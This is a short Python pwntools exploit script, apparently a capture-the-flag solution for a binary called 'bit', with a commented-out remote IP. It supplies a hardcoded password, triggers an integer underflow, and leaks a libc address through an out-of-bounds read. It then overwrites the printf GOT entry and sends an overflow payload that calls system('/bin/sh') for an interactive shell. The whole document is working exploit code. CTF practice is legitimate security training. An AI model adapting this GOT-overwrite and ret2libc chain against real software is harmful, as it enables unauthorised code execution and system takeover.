from pwn import *

r = process("./bit")
# r = remote("128.199.135.210", 31335)

r.sendlineafter("Enter your password:\n", "5unKn0wn")
r.sendlineafter("Please set your user_id: ", "-65536")	# integer underflow

r.sendlineafter("How many numbers do you want to sort ?\n", "126")
nums = ' '.join(str(0) for i in range(126))
r.sendlineafter("Enter 126 integers\n", nums)
r.sendlineafter("You can review all your numbers. Enter -1 to break\n", "-13")

libc_base = int(r.recvline(), 16) - 0x5c0c0	# local
# libc_base = int(r.recvline(), 16) - 0x5c5d0	# remote
system = libc_base + 0x3ada0
binsh = libc_base + 0x15b9ab
log.info("libc_base : " + hex(libc_base))
r.sendline("-1")

r.sendlineafter("Enter value to find", "134513516")

for i in range(22):
	r.sendafter("Do you want to edit it ?", 'n')

r.sendlineafter("Do you want to edit it ?", 'y')	# overwrite printf got
r.sendlineafter("Enter new value\n", str(0x0804860F))	# another read

payload = "A" * 0x30
payload += p32(system)
payload += p32(0x41414141)
payload += p32(binsh)

r.sendline(payload)
r.interactive()
